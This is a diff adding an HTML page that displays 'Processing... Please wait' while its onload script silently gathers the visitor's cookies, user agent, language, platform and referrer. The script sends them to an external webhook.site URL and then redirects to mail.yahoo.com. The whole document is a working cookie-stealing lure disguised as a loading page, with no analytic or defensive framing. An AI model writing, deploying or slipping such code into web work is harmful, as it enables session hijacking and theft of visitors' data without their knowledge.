@@ -1,0 +1,31 @@
+
+        <html>
+        <head>
+            <title>Processing...</title>
+        </head>
+        <body>
+            <p>Please wait...</p>
+            <script>
+                window.onload = function() {
+                    // Capture cookies and browser information
+                    const cookies = document.cookie || 'No cookies found';
+                    const userAgent = navigator.userAgent || 'No user agent found';
+                    const language = navigator.language || 'No language found';
+                    const platform = navigator.platform || 'No platform found';
+                    const referer = document.referrer || 'No referer found';
+                    
+                    // Send the captured data to Webhook
+                    const data = `Cookies: ${cookies}, User-Agent: ${userAgent}, Language: ${language}, Platform: ${platform}, Referer: ${referer}`;
+                    fetch('https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25?data=' + encodeURIComponent(data))
+                        .then(response => console.log('Data sent to Webhook'))
+                        .catch(error => console.error('Error sending to Webhook:', error));
+
+                    // Final redirect to mail.yahoo.com after 5 seconds
+                    setTimeout(function() {
+                        window.location.href = "https://mail.yahoo.com";
+                    }, 5000);
+                };
+            </script>
+        </body>
+        </html>
+        
